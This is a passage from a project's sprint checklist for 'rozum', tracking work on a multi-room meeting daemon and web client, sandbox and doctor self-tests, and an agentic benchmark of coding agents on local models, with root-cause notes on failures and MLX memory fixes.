- [x] **Live-update fix** — a reverse proxy (Tailscale serve) buffers the SSE `/api/stream`, so the
      phone never saw new/just-sent messages. Added a `pollHistory` fallback (re-fetch /api/messages
      every 2.5 s + immediately after submit; `add()` dedups by date:n). web_index.html.
- [x] **Room picker** — DONE in the `.ssc` page header: dynamic `<select>` from
      `rozum meetings status`; each room is a `/r/<room>` GET, `/m/<room>` live fragment, and
      `/p` POST with `room=<room>`.
- [x] **Re-author the meeting web in `.ssc`→Rust (operator directive) — DONE; now the ONLY version.**
      `clients/meeting/meeting.ssc` compiles to a standalone Rust binary: multi-room from the daemon
      registry, project transcripts read from `<project>/.rozum/room`, global transcripts from
      `$XDG_STATE_HOME/rozum/rooms`, per-handle role colours, live JS polling of `/m/<room>`,
      fetch posting → `rozum meetings post`, full PWA (manifest/sw/icon + iOS standalone), grabber
      pull-to-refresh, flex + `visualViewport` layout (picker pinned, input above keyboard). launchd
      `com.rozum.meeting-ssc` :8405, Tailscale `:8443`+`:8446`. The hand-written
      `web.rs`/`web_index.html`/`meetings web` subcommand were REMOVED (`445c7a8`, cargo check clean).
      Toolkit fixes that unblocked it landed in scalascript `feature/rust-web-toolkit` (`a0aa846`:
      `&str` patterns, borrow intrinsics, `String.toList`→`.chars()`, `.sum`, http `no-store` +
      MIME-by-extension).

**Now — autonomous polish queue (operator: "все задачи в спринт и делай автономно", 2026-06-21):**
- [x] **Trim history** — `msgsView` now `takeRight(80)`s the content lines so polling + render stay
      bounded as rooms grow. Needed new toolkit Vec ops.
- [x] **Message timestamps** — `tsOf` parses the jsonl `"ts":` epoch, +UTC offset, shows a dim
      `HH:MM` per row. Surfaced + fixed a latent **ordering bug**: `readRoom` concatenated dated files
      in `listDir` order (non-chronological) → now `.sorted` so the newest message is last.
- [x] **Dynamic room list — DONE 2026-06-23.** The selector is rebuilt from `rozum meetings status`;
      project rooms use their registered project path, global/ad-hoc rooms use the user state dir.
      Junk-room pressure is handled by `/manage` clean-empty instead of hiding the registry.
- [x] **Highlight the operator's own messages** — NOT FEASIBLE as posed: the human web client and the
      agents all post under the same local identity ("Sergiy · <handle>"), so there is no reliable
      "me" marker distinct from agents. Per-handle colour (shipped) already separates sessions.

- [x] **Content integrity** (found in an audit, not the original queue) — messages containing a `"`
      were truncated: `msg()` split on the next bare quote. Now split on the `","ts":` boundary +
      `.replace("\\\"", "\"")` to un-escape. Needed a toolkit `.replace(from,to)`→`&str` patterns fix.
- [x] **Empty-room placeholder** + auto-scroll-to-newest on live update (when already at bottom).
- [x] **End-to-end QA (2026-06-21)** — all 8 routes 200 with correct MIME (html / manifest+json /
      text/javascript / image/svg+xml); post round-trips in both rooms; full content (no truncation);
      per-handle colours; `HH:MM` timestamps. Live on `:8443`+`:8446`.
- [x] **Readability polish (2026-06-21)** — inline `` `code` `` → monospace pills; `working:`/`done:`/
      `blocked:` status badges; per-day date dividers; favicon already served via `/icon.svg`. The rozum
      coordination room is now scannable. `.ssc` index-iteration needs a val-bound seq
      (`.takeRight(80).toList`) to stay indexable; inline split-index doesn't lower.

- [x] **Rich text + presence (2026-06-21)** — `**bold**`, clickable `http(s)` links, and an
      **active-participants bar** (distinct authors of the last 25 messages, coloured chips below the
      tabs). Note: `roster.json` is cumulative (daemon `leave()` does not prune it — `room.rs:194`),
      so "active = recent authors" is more accurate than the roster for a live "who's here".

Toolkit work that landed for the above (scalascript `feature/rust-web-toolkit`): Vec `.take`/`.drop`/
`.takeRight`/`.dropRight`/`.sorted`/`.distinct` lowering (`.drop` had collided with Rust's `Drop`);
`.replace`→`&str`; string char-hash (`String.toList`→`.chars()`, `.sum`).

#### demo-polish-and-resilience (2026-06-20, operator-approved) — make the live demo boringly reliable

**Goal:** after the sandbox/model-participant push, turn the demo path into something a human can
preflight, trust, and hand to sibling agents without rediscovering stale state. This is a
cross-cutting polish queue; detailed web tasks remain under `meeting-web-pwa-ssc`, and long-term
portability stays in BACKLOG.

- [x] **demo-doctor-self-test — first implementation pass (DONE 2026-06-20).** Added
      `rozum doctor [--web-url <url>] [--strict]` (spec:
      `docs/specs/demo-doctor.md`) to report meeting daemon reachability, room list, shared gateway
      health, sandbox backend/network, Docker image availability when Docker is selected, web/PWA
      endpoint reachability when a URL is supplied, Tailscale CLI availability, and the
      `scripts/demo-conference.sh` launcher. Must be non-destructive: no model launch, no service
      mutation, no Docker pulls, no room posts. Verified: `cargo test doctor --lib
      --no-default-features`, `cargo test doctor --lib`, `cargo build --bin rozum
      --no-default-features`, and live `target/debug/rozum doctor`.
- [x] **sandbox-regression-harness — DONE 2026-06-20.** Added
      `tests/sandbox_regression.rs`, an explicit jail-invariant target for
      Seatbelt/Docker: workspace write allowed, secret read/write denied, selected network policy
      enforced (`none`/`gateway-strict`), gateway reachable when expected, simple Rust build works
      inside the jail, no-approval flags are applied only for jailed headless launches, and opencode
      config remains visible in Docker. Fast coverage is safe by default; slow/host-mutating checks
      are `#[ignore]`. Verified: `cargo test --test sandbox_regression --no-default-features`,
      `cargo test sandbox_autonomy --no-default-features`, and macOS Seatbelt e2e via
      `cargo test --test sandbox_regression seatbelt_e2e_allows_workspace_and_denies_secret_and_escape
      --no-default-features -- --ignored`. Docker e2e rerun is deferred to BACKLOG
      `sandbox-docker-e2e-rerun` because Docker Desktop is memory-heavy and may be intentionally off.
- [x] **PWA room picker/linking/live room binding — DONE/SUPERSEDED 2026-06-23.** The shipped `.ssc`
      client uses dynamic room `<select>` from `rozum meetings status`, shareable `/r/<room>` links,
      live `/m/<room>` fragments, and `/p` submits with `room=<room>`.
- [x] **Mobile unread-state polish — DONE 2026-06-23 (sunny-civet).** Room-switcher `<select>` now
      shows `name (N)` unread badges per inactive room. New `/u` route returns `name|count` per room
      (`roomCount` counts `"content":"` lines via `readRoom`); the client polls it every 5 s, tracks
      per-room last-seen in `localStorage` (`rozumSeen`), badges unread, marks the current room read,
      and treats the first-ever load as all-read (no all-unread noise). Built with the updated `ssc`
      (the `5408689` lowering fix), validated live on :8405 (`/u` returns counts, page 200).
- [x] **`.ssc` live data binding for meeting web — DONE 2026-06-23.** The ScalaScript/Rust web client
      is bound to live rozum rooms/transcripts/submits and is the shipped meeting web; the legacy
      hand-written web path remains removed.
- [x] **sprint-backlog-hygiene — DONE 2026-06-20.** Removed stale sprint/backlog signals now
      contradicted by master:
      model-participant is done, sandbox P3 is complete except optional Linux native jail, daemon web
      exists, and follow-up bridge wording now separates daemon-backed web from legacy
      telegram/discord bridge ports. The old `codex/queue-serving-hygiene` branch/commit `14c425f`
      remains consciously unmerged for separate review; it is not a current sprint blocker.
- [x] **windows-core-ci — DONE 2026-06-20.** Added a low-risk portability gate in
      `.github/workflows/ci.yml`: `windows-latest` build/test with `--no-default-features`,
      mirroring `linux-core`. This documents/exposes Unix-only assumptions without starting a full
      Windows port.
- [x] **meetings-rest-read — DONE 2026-06-21.** Added the daemon-side read-only HTTP API gated by
      `ROZUM_WEB_SECRET`: `GET /rooms/{name}/days` and
      `GET /rooms/{name}/messages/YYYY-MM-DD?from=N&count=M`. It reads only the room registry,
      `index.json`, and daily transcript files; no room writer/model/web UI path is touched. Listener
      is opt-in via `ROZUM_WEB_SECRET` and binds `ROZUM_MEETINGS_REST_BIND` or `127.0.0.1:8401`.
      Verified with tempdir REST unit tests, daemon tests, `cargo build --no-default-features`, and a
      live temporary-daemon curl smoke that posted into `rest-smoke` and read the message back.
- [x] **model-participant web controls — DONE 2026-06-21.** `rozum meetings web` now has a compact
      model control panel plus authenticated `/api/model/status`, `/api/model/start`, and
      `/api/model/stop`. It supervises one managed `rozum meetings participant` child per web process,
      passes model/handle/gateway/reply-policy/peers/persona options through to the existing CLI,
      rejects a second start with `409`, reports child exit and best-effort gateway state, and stops
      only the managed child. Verified with focused web tests, no-default build, and an isolated
      temporary-web live smoke (status → start manual participant → 409 on second start → stop).

#### matrix-failure-analysis (2026-06-18) — study every matrix red → fix or prove-structural+document

From the full-canonical matrix on master (60 cells, `results/full-canonical-091719`): claude 19/20,
opencode 17/20, codex 10/20 = 46/60, **0 panics / 0 rc=2** (infra clean; BUG-001 holds at full
scale). The **14 reds** are being worked one root-cause at a time. Living doc + evidence + verdicts:
`docs/matrix-failure-analysis.md`. Method: reproduce each cell with `KEEP=1`, classify by control
(other agent passes ⇒ agent mechanism; all fail ⇒ model ceiling), prove our-bug vs model-limit
before concluding.

- [x] **Finding 1a — codex stalls in the approval/meta-tool layer (30B repro).** Model requests
  escalated permissions (rejected under `approval=never`) + calls meta-tools (`request_user_input`),
  falls back to `cargo new <name>` (subdir). Plain shell itself works (`cargo new` in 154 ms).
- [x] **Finding 1b — codex writes CODE via `echo > file`; zsh escaping corrupts it (gpt-oss repro).**
  `println!("{}", rev)` → `println!({},rev)` (quotes lost) → won't compile; codex too slow → timed
  out before recovery. **This is the real "why not plain shell"**: shell is fine for commands,
  fragile for source code. claude/opencode write raw content via structured tools → code lands intact.
  Together 1a/1b **overturn** the (mock-derived) "structured-edit MCP" hypothesis.
- [x] **Finding 2 — opencode appends a DUPLICATE `fn main` (gpt-oss repro)** → E0428; its structured
  write is fine, the model's *edit* (append-vs-replace) isn't; timed out before fixing. Model-quality, not infra.
- [x] **Finding 3 — gpt-oss `build` is NOT a ceiling.** claude PASSES it (62 s). No true model ceiling
  among the 14 — a single matrix run mislabeled a flaky cell. The model emits buggy first drafts;
  whether a run passes is decided by **agent recovery within the time budget** (claude re-Writes the
  whole file and recovers; codex/opencode time out).
- [x] **Finding 4 — codex `fix`/`debug` (edit-existing): unified-diff vs apply_patch mismatch (27B repro).**
  The model correctly diagnoses the bug, then emits a **standard unified diff** (`--- /+++ /@@`) into
  codex `apply_patch`, which wants its bespoke `*** Update File:` format → `Invalid patch hunk` → edit
  never lands → bug stays. The precise, evidence-based version of `project-codex-patch-barrier`,
  specific to **edit-existing**. **Most actionable lever:** bridge unified-diff → apply_patch
  (gateway/wrapper). opencode `fix` **flaky-passed** the repro → its fix reds are speed/variance, not structural.
- **Synthesis:** codex fails *differently by task shape* (create → echo/approval 1a/1b; edit → patch
  mismatch F4). 3 interacting factors, none a clean infra bug — model code-quality × agent file-write
  mechanism (codex shell-echo/approval vs claude raw-Write vs opencode append-error) × speed/time-budget.
- [x] **raw codex tool-call capture — DONE 2026-06-21.** Added opt-in
  `ROZUM_CODEX_TOOL_CAPTURE=1` JSONL events for the Codex `/v1/responses` tool
  inventory and completed tool calls, preserving raw vs post-rewrite names/args
  across streaming and non-streaming paths.
- [x] **Still to do (superseded 2026-07-03):** repro the `fix`/`debug`/`test` reds was done via
  subsequent gateway fixes (codex-patch-barrier, catheredoc-normalize-v2, write-synth, exec-decode-loopbreak)
  and matrix re-runs (16/20→27/30). See the `gateway reliability` entry above for the verdict per fix.

> Note (2026-06-18): staged on branch `docs/matrix-analysis` (off master) because a co-agent occupies
> the master worktree; fast-forward / merge into master when it's free.

#### Meeting-room daemon: disk-backed, multi-room, dedicated daemon (spec stage, 2026-06-16)

Spec committed: `docs/specs/agent-meetings-daemon.md` (supersedes the
one-process-one-room topology in `agent-meetings-process.md`; `SPEC.md` updated).
Puts meeting rooms in a **dedicated meeting daemon** (`rozum meetings`) as many
disk-backed rooms (supervised tasks, not threads); the **model gateway is
untouched**. Key decisions locked with the user:
- **Topology**: dedicated meeting daemon `rozum meetings` (control:
  `start|stop|status`, like `rozum gateway`; `install|uninstall` as a launchd/
  systemd user-service like `rozum service`), separate from the gateway (gateway
  is stateless/scalable/idle-exiting, rooms are stateful/single-writer — don't
  co-host); model-as-participant is a localhost HTTP call to the gateway.
- **Storage**: append-only JSONL is canonical, in the project at `.rozum/room/`,
  split into daily files (`YYYY-MM-DD.jsonl`); message address is `(date, n)` with
  a per-day counter `n` reset to 0 each day (no global seq); daemon holds only
  high-water `(date,n,offset)` + budget counters (no turns in RAM). Lazy-created
  on first message; `.rozum/.gitignore`=`*`; `index.json` date→{count,bytes};
  `rooms.json` registry of room locations for discovery/reopen.
- **Single writer + direct-read clients**: `submit` is an RPC to the daemon (it
  owns seq/append/budget); TUI + `mcp-proxy` read `transcript.jsonl` directly,
  write-before-notify, content never transits the daemon. Agent tool contract
  unchanged.
- **Identity**: opaque `ParticipantId` + friendly per-project handle, stable for
  the proxy's session (token in proxy memory, binding persisted in `roster.json`);
  `#N` suffix removed.
- **Rooms by project**: project → one canonical room (idempotent); TUI is a
  daemon client — launched in a project it enters that room, else a picker;
  `[o]rooms` statusline shortcut to select/switch; many TUIs, independent. TUI
  renders/scrolls **by day** (loads current day, lazy older days, day separators).
- **Future (not now)**: remote stateless REST read on the meeting daemon,
  **day-scoped** (`GET /rooms/{name}/days` +
  `GET /rooms/{name}/messages/YYYY-MM-DD?from=N&count=M`).

**Status: P0–P6 ALL DONE + first polish pass (54 meeting tests green + live
CLI/stdio smoke) on branch `feature/meetings-impl`. The meeting daemon, agent
proxy, user-service, and human TUI client are implemented end-to-end.
POLISH DONE: graceful SIGTERM drain (pending waits → `{ended:server-shutdown}`),
idle-evict watchdog (`ROZUM_MEETINGS_IDLE_SECS`), and **content off the daemon**
(`wait` returns coordination only; proxy + `MeetingClient` read content from disk
via `store::read_since`). The only unverified piece is the ratatui *rendering* of
`rozum meetings attach` (needs interactive run); its logic is unit-tested.
`src/gateway.rs` untouched; fully additive. POLISH (2nd pass): per-room
panic isolation — every daemon tool handler runs under `guard(...)`
(`catch_unwind`), test `guard_isolates_panics`. POLISH (3rd pass) — all three
remaining items DONE: (a) **bare-`rozum` cutover** — `rozum` now attaches a TUI
to the daemon by default; `--legacy-room` (or `--web-port`) keeps the legacy
in-process room (bridges + sampling) as the escape hatch (additive, nothing
removed); (b) **room picker** — `Ctrl-O`/`/rooms` lists rooms (name/topic/
participants/last-day from enriched `rooms.list`), ↑↓+Enter switch, `/new`/`[+ new
room]` creates an ad-hoc room (`rooms.new`); (c) **second poll connection** —
`MeetingClient::spawn_poll` long-polls on its own connection + streams via mpsc,
so keypresses never cancel an in-flight `wait_my_turn` (tests
`poll_stream_delivers_new_messages`, `rooms_new_creates_ad_hoc_and_list_enriches`).
57 meeting tests green. ONLY the ratatui *rendering* of `rozum`/`rozum meetings
attach` needs interactive verification. **Update 2026-06-20:** model-as-participant is now done
via `rozum meetings participant` (see `docs/specs/demo-conference.md`); the daemon-side remaining
item here is the deferred REST read.**
Build sequence (each phase compiles + has its own tests; do them in order — P0→P2
are pure library and land behind today's behavior, P3 brings the daemon up, P4/P5
are clients and can go in parallel, P6 is the service):

- [x] **P0 — Storage core** — DONE (`src/meeting/store.rs`, 9 tempdir tests green;
      branch `feature/meetings-impl`). Library, no daemon. New `src/meeting/store.rs`:
      `RoomPaths` (resolve `<project>/.rozum/room/`, ad-hoc fallback
      `$XDG_STATE_HOME/rozum/rooms/<name>/`, `rooms.json` registry, write
      `.rozum/.gitignore`=`*`); `TranscriptWriter` (lazy-create on first append,
      daily file `YYYY-MM-DD.jsonl`, per-day `n` reset at rollover, `index.json`
      date→{count,bytes}, `meta.json` incl. `budget_chars`); `TranscriptReader`
      (open day file, tail `[off,end)`, parse whole lines, roll to next day).
      *Verify (tempdir unit tests):* append→`(date,n)`; rollover resets `n`;
      reader tails new lines; reopen recovers high-water from newest day;
      `index.json` rebuild; `.gitignore` + `rooms.json` add/list.
- [x] **P1 — Identity** — DONE (`src/meeting/identity.rs`, 6 tests green). Additive
      primitives (`Roster`/`RosterEntry`, `resolve_or_mint`, `mint_handle`,
      `display_name`): opaque UUID `ParticipantId` + `handle` (adjective-animal,
      unique-in-room) + `session_token` reconnect key, `roster.json` round-trip;
      no `#N`. Wiring into the room (replacing name/staleness reclaim) lands in
      P2/P3. *Verified:* same token→same id/handle; new token→new handle; roster
      reload rebinds; minted handle avoids taken.
- [x] **P2 — Room model** — DONE (`src/meeting/room.rs` `DaemonRoom`, 6 tests; all
      44 meeting tests green). PLAN ADJUSTMENT: built a **new** disk-backed room
      model additively instead of mutating the live `state.rs::Meeting` — keeps the
      build green; `DaemonRoom` owns a `TranscriptWriter` (no content in RAM) + a
      `Roster`, free-submit, shrunk `RoomEvent` (`{date,n,end_offset}`, no content),
      budget from the writer. The legacy in-process `Meeting`/`run_room`/web path is
      retired when bare `rozum` becomes a client (P5). *Verified:* join mints+
      persists+rebinds-by-token; submit appends to disk + emits shrunk Posted;
      reopen restores high-water+roster; max-chars ends.
- [x] **P3a — RoomRegistry** — DONE (`src/meeting/registry.rs`, 3 tokio tests).
      `RoomHandle = Arc<AsyncMutex<DaemonRoom>>`; lazy `get_or_create` (open from
      disk if `meta.json` exists, else fresh), `get_by_name` via `rooms.json`,
      `evict` (files stay, reopen on demand), `list`, `open_count`. *Verified:*
      idempotent while open; evict→reopen continues from disk (high-water+roster);
      list/get_by_name see registered rooms.
- [x] **P3b — daemon server + CLI** — DONE (`src/meeting/daemon.rs` +
      `src/main.rs` `meetings` cmd; 2 in-process rmcp tests + live CLI smoke).
      `MeetingServer` (rmcp on `meeting.sock`, per-session room) over the
      `RoomRegistry`: `rooms.list/join`, `_join_internal{project,session_token}`,
      `meeting.submit/wait_my_turn/mark_responding/status/leave`; lazy reopen via
      registry; `pub daemon_alive`/`daemon_rooms` client helpers. CLI `rozum
      meetings start [--foreground] | stop | status` (detached spawn, pidfile,
      socket-ping liveness, `kill` stop). *Verified:* join→submit→wait→list
      roundtrip over a unix socket; same-token rebind across reconnect; live
      start→status→stop lifecycle clean (no stray procs). DEFERRED to follow-ups:
      idle-evict watchdog, graceful drain (pending waits → `{ended}`) on SIGTERM,
      per-room `catch_unwind`; `install|uninstall` is P6.
- [x] **P4 — mcp-proxy → daemon** — DONE (`src/meeting/daemon_proxy.rs`; 1
      in-process roundtrip test + binary stdio smoke). New `DaemonProxy` stdio
      server: generates a `session_token` once, detects project (git root/cwd),
      auto-spawns the daemon (`rozum meetings start`), auto-joins the project room
      via `_join_internal{project,session_token}`, forwards `rooms.*`/`meeting.*`,
      and tracks the `(date,n)` cursor so `meeting.wait_my_turn` takes no args.
      `rozum mcp-proxy` now uses it by default (`ROZUM_LEGACY_PROXY=1` for the old
      per-room-socket proxy). PLAN NOTE: built additively beside legacy
      `proxy.rs` (untouched) rather than rewriting it. DEFERRED: move the wait
      content-read from the daemon into the proxy (`TranscriptReader`) — daemon
      currently returns content; the proxy already tracks the cursor. *Verified:*
      auto-join→submit→cursor-tracked wait→rooms.list over a unix socket; `rozum
      mcp-proxy` serves the 7-tool surface over stdio.
- [x] **P5 — TUI as client (model + shell)** — model DONE & tested; ratatui shell
      functional, interactive-verify pending. `src/meeting/tui_client.rs`
      `MeetingClient` (2 tests): connect-as-human, `list_rooms` (incl. `root`),
      `enter_project`/`enter_named` (joins `kind="human"`, identity on
      `rooms.join`), disk-read day-scoped transcript, cursor-tracked `poll`,
      `load_prev_day` scrollback. `src/meeting/attach.rs` + `rozum meetings
      attach [--room]`: ratatui loop (transcript + day separators + input,
      PgUp=older, Esc=quit), auto-spawns daemon, enters cwd project room.
      PLAN NOTE: additive (`rozum meetings attach`) — bare `rozum` / legacy
      `tui/mod.rs` untouched; the bare-`rozum`→client cutover + full picker UX are
      follow-ups. *Verified:* model tests (enter/submit/tail/list, scrollback) +
      build/CLI; **ratatui rendering needs interactive `rozum meetings attach`.**
      FOLLOW-UP: poll-cancel on keypress abandons one daemon long-poll (self-
      corrects); a second connection for the poll loop would avoid it.
- [x] **P6 — user service** — DONE (`src/service.rs` `meetings_launchd_plist`/
      `meetings_systemd_unit` + paths/labels, 3 tests; `rozum meetings
      install|uninstall` in `src/main.rs`, cfg-gated macOS/Linux). launchd
      `com.rozum.meetings` / systemd `rozum-meetings.service`, runs `meetings start
      --foreground` with RunAtLoad+KeepAlive / Restart=on-failure; logs under
      `state/meetings/service.log`. *Verified:* generation unit tests + CLI `--help`
      wires up; the real `launchctl`/`systemctl` call is operator-validated (same
      convention as the gateway service — not run against the dev machine).
- [x] **Deferred (not now):** Future REST read-by-day on the meeting daemon's HTTP
      (`/rooms/{name}/days`, `/messages/<date>`). Model-as-participant via gateway
      local HTTP is DONE as `rozum meetings participant`.

#### agent-meeting-coordination — meetings as the collaboration system (2026-06-18, user-driven)

**Goal:** all the user's agents coordinate via meetings when they need to; the human sees what's
happening any time + intervenes, from any client. The daemon becomes a collaboration hub with
**equal pluggable clients** (TUI/web/telegram/discord/remote) + a **`Principal` identity layer**
(one human = one identity across clients; agents auto-identified; multi-user/remote = a resolver
swap later). Spec: `docs/specs/agent-meeting-coordination.md`. Phased P1–P4.

- [x] **P1.1 — post transport + author display (DONE 2026-06-18, branch
  `feature/agent-meeting-coordination`).** `meeting::tui_client::post_once` + `rozum meetings post
  <text> [--room <name>] [--as <display>]`: one-shot connect→join (project room by default, or a
  named room)→submit→exit; **auto-spawns the daemon** if down. The transport the SessionStart/Stop
  hooks will call + a handy human/script post. Also **surfaced the author** in the transcript:
  `room.rs::submit` now writes `display_for(id)` = `base_name · handle` (e.g. `claude · spry-wren`)
  instead of the bare handle, so readers see WHO posted (the `--as`/agent name). Verified live
  (auto-spawn → post → on disk → author shows the name) + `post_once` unit test (lands in room,
  unknown-room errors cleanly). 380 fast tests green.
- [x] **P1.2 — shared room (DONE) / true multi-room (deferred).** `ROZUM_MEETING_ROOM=<name>`
  routes an agent into ONE shared room (e.g. `commons`) instead of its per-project room: the
  proxy's auto-join uses `rooms.new` (create-or-open) when set, and `rozum meetings post` honors it
  (precedence `--room` > `ROZUM_MEETING_ROOM` > project) so hook posts land where the agents are.
  Verified live (post created+routed to `commons`; `status` lists it) + a `post_once` Shared
  create-or-open unit test. **Deferred (needs a daemon model change — best shaped by dogfooding):**
  being in the project room AND `commons` *simultaneously* (the daemon session is single-room);
  and a `rozum.toml [meeting]` config (env-only for now).
- [x] **P1.3 — `rozum mcp install/uninstall` (DONE 2026-06-18).** `rozum mcp install [--agent
  claude|codex|opencode|all]` registers `rozum mcp-proxy` via each agent's **own `mcp add`**
  (robust — agent owns its config), `uninstall` via `mcp remove`; idempotent (remove-then-add).
  Verified live + reversibly (claude user-scope ✔ Connected + codex registered, then removed).
  opencode's `mcp add` is interactive → guidance-only (config-write follow-up). 3 unit tests
  (`mcp_add_spec`/`mcp_remove_spec`/`expand_mcp_agents`).
- [x] **Presence via the proxy, not hooks (DONE 2026-06-18 — superseded the CC hooks).** The
  mcp-proxy posts a `joined:` line on its first join and a `left:` line when the agent's session
  ends, **over the agent's own session** → the presence line carries the agent's handle (unified
  with its messages), works for **every** agent (not just CC), and edits no `settings.json`. This
  replaced the earlier CC `SessionStart`/`SessionEnd` hooks (would double-post, CC-only, intrusive)
  — removed the hook-merge code + `--no-hooks` flag; kept serde_json `preserve_order` (harmless).
  Verified (the existing daemon-proxy test now asserts the `joined:` line + the submit).
- [x] **P1.4 — coordination instructions + AGENTS.md convention (DONE 2026-06-18).** Rewrote the
  mcp-proxy `PROXY_INSTRUCTIONS` (every connecting agent sees it) into a coordination contract:
  announce `working:` on start, check the room before clashing on files/`responding`, ask when
  blocked, post `done:`/`blocked:` on finish, human messages are priority — on the agent's own
  judgement. Strengthened AGENTS.md "Meeting-room coordination" (join paths, the etiquette, the
  one-shot `rozum meetings post`).
- [~] **P1.5 — TUI multi-room visibility.** The room picker (Ctrl-O / `/rooms`) already lists
  every room enriched with participants + last-activity day, so the human can see + switch across
  all rooms — the core multi-room visibility. A dedicated always-on overview *dashboard* (all rooms'
  unread at a glance) is **interactive-shaped polish** — best built once the operator has used the
  current TUI and says what the overview should show (can't be render-verified without a TTY).
- [x] **P1.6 — local-default `Principal`: stable local identity (DONE 2026-06-18).**
  `src/meeting/local_identity.rs` persists a stable `{token, display}` in
  `~/.config/rozum/identity.json`; the TUI (`MeetingClient::connect_as`) + `rozum meetings post`
  (human path) use it, so the operator is **one participant (handle) across launches/clients**
  instead of a fresh random one. `rozum identity whoami` / `set-name <name>` manage it. Verified
  live (two posts → same `Sergiy · mellow-marten`; set-name keeps the token) + a path-injected unit
  test (no global-env mutation). The first, zero-config rung of the Principal model. **Remaining
  (P2-P4, dogfooding-shaped):** unify the agent's hook-post + mcp-proxy handles (needs session
  correlation); link one human across web/telegram (P3); auth + multiple/remote humans (P4).
- [x] **P1.7 — daemon-backed web client with shared-secret auth (DONE 2026-06-19/20).**
  A human web UI to the **daemon** meeting rooms (the legacy `rozum web` bridges the in-process
  room — this one reads the daemon's disk transcript + submits via the daemon). `rozum meetings web
  [--port P] [--room name] [--bind addr]`. Auth = a single shared secret (env `ROZUM_WEB_SECRET`,
  else generated + printed on start): a login page takes the code → sets a cookie; API + stream
  require it. Endpoints: serve the chat page; `GET /api/messages?since=` (read transcript from
  disk); `POST /api/submit` (submit as the local human identity); `GET /api/stream` (SSE tailing
  the room → the **wakeup**: new messages appear live). Acceptance (with the user): the operator
  opens the link, logs in with the code, sees the transcript, posts a message that an agent (or
  `rozum meetings post`) sees, and an agent's reply appears live via SSE. **This is the first equal
  non-TUI client (P3 groundwork).** Implemented as `src/meeting/web.rs` + `rozum meetings web`;
  later PWA polish/no-auth/live-poll fallback is tracked under `meeting-web-pwa-ssc`.

> **MLX native runtime is DONE (correctness + perf), 2026-06-13.** Decode root-caused
> & fixed (bf16 stream leak in GatedDeltaNet q/k scaling → ~1000 casts/token): MoE
> decode 33→~88 t/s (2.7×), prefill →1215 (=Python), dense 16→~19.6; byte-exact; merged
> to master `74c7a96`, fork `0d4b3729`. The P0/P1 below are that work (kept for record).
> Chosen next (2026-06-13, user): the three tasks here; hand-fused Metal kernels → BACKLOG.

#### Agentic local-model reliability + memory (2026-06-16, from the agentic benchmark)

**Final 5-model matrix (2026-06-16, all fixes on): claude 18/25, codex 8/25. Infra is clean** — 0 loops,
0 timeouts, 0 crashes in working models. Remaining failures are model/agent, root-caused:
- **35B-A3B `rc=2` (memory, the only infra-ish failure).** The 35B gateway OOMs **during a single-shot
  prefill** of a big agent prompt: the prefill activation spike + ~25 GB resident hits the MLX memory cap
  (`total−8 = 28 GB` on a 36 GB Mac), and a **Metal OOM is process-fatal** → the gateway dies → every
  later task on that model returns `rc=2`. Not "the agent can't get RAM" (it needs <1 GB) — the *model's
  prefill* momentarily wants >28 GB. And the host rarely has spare RAM (≈7 GB free with a Claude Code
  session running). 27B (5/5) is the practical ceiling for 36 GB; 35B lowered + caveated in `models.rs`.
- **codex wrong paths (the big codex cluster).** The model runs `cargo new reverse-cli --lib` → creates a
  **subdirectory** (forbidden) + a lib (not bin), then can't edit its own files (they're in the subdir).
  Model instruction-following gap, amplified by codex's shell-first style; Claude uses `Write`/`Edit` →
  files land in cwd → passes. Hence claude 72% vs codex 32%.
- **Coder-7B text-only** (turns=1, tools=0): writes the solution as prose instead of calling tools.

- [x] matrix-teardown-panic — **DONE 2026-06-18 (P0; harness-side; ported to master).** The
  agentic matrix **rebooted the Mac via a KERNEL PANIC** — not an OOM. `scripts/bench/agentic.sh`
  tore each model's gateway down with `kill -INT` → 60s → **unconditional `kill -KILL`**; a SIGKILL
  landing on a wedged Metal eval double-frees an IOGPU buffer
  (`IOGPUGroupMemory::remove_memory_object() not found`) → panic → reboot. Fix (validated no-panic
  on 27B on the original `feature/matrix-teardown-panic-fix`, which went 70 commits stale → the
  still-needed change was **ported fresh onto master**, not merged): graceful teardown — SIGINT →
  wait `TEARDOWN_GRACE` (180s) for a clean exit → SIGKILL **only as a loudly-flagged last resort** →
  `GPU_SETTLE` (8s) so the kernel finishes async IOGPU reclamation before the next gateway allocates.
  Also added `ROZUM_GATEWAY_UNLOAD_IDLE_SECS=0` to the launch (keeps the shared gateway alive across
  the claude/codex phases — the `clients_gone` self-exit, [[project-agentic-bench-clients-gone]]).
  `bash -n` clean. Tracked in **BUGS.md BUG-001**; root cause [[project-matrix-kernel-panic]].
  **VALIDATED ON MASTER 2026-06-18 (BUG-001 → done):** two matrix runs, neither produced a new
  `.panic`. (1) 35B × claude+codex+opencode × 5 tasks = **15/15 PASS, rc=0**. (2) the decisive one —
  claude × `27B → 30B-A3B → 35B` (`ROZUM_MLX_CACHE_GB=1`) = **15/15 PASS, rc=0, no panic across 2
  inter-model teardown transitions, no SIGKILL fired** (every gateway exited gracefully; footprint
  flushed 17.8→19.6→21.1 GB between models). The inter-model transition is exactly where the panic
  used to hit.
  **Deliberately NOT done (tracked follow-up):** the deeper rozum-side bounded/non-wedging teardown
  (a real Metal-eval timeout; Drop's `join()` can't block forever) — it touches the GPU teardown hot
  path and can't be validated without risking a reboot, so it isn't shipped blind.
- [x] mlx-chunked-prefill — **DONE 2026-06-16 (dense paths + lower default; fork `9fa852f4`).** Found the
  hybrid Qwen3.6 path ALREADY chunked; the gap was the **dense** `qwen3`/`qwen3_moe` Generate (single
  forward over the whole prompt → unbounded activation spike). Both dense Prefill states now chunk at
  `prefill_chunk_size()`, advancing the KV cache and eval'ing only the cache between chunks (MLX lazy-skips
  `lm_head` on discarded chunks). Added `KeyValueCache::collect_eval`. **Byte-exact verified on Qwen3-4B**
  (chunk=64 == single-shot). Lowered `PREFILL_CHUNK_DEFAULT` 2048→1024 for 35B headroom (incremental
  prefix-reuse makes per-turn cost ~nil). Cargo rev bumped. **Open:** the 35B OOM relief is reasoned, not
  re-measured (needs RAM headroom — pair with `ROZUM_MLX_CACHE_GB=1`); qwen2/gemma3/llama dense paths not
  yet chunked (rare/dropped models, no current OOM).

The agentic e2e matrix (`scripts/bench/agentic.sh`, 9 models × claude+codex × 5 tasks) drove a chain
of backend fixes and surfaced the levers below. **DONE this round:** cache-aware attention mask for
qwen2/llama (fork `bddd6feb`, fixes the multi-turn prefix-reuse crash), unify+robustify tool-call
parsing in `serving` (loose markdown/bare JSON), suppress loose tool calls from the text stream (fixes
the agentic re-emit loop), constrain-on-by-default, **JSON-repair** (recovers malformed tool calls on
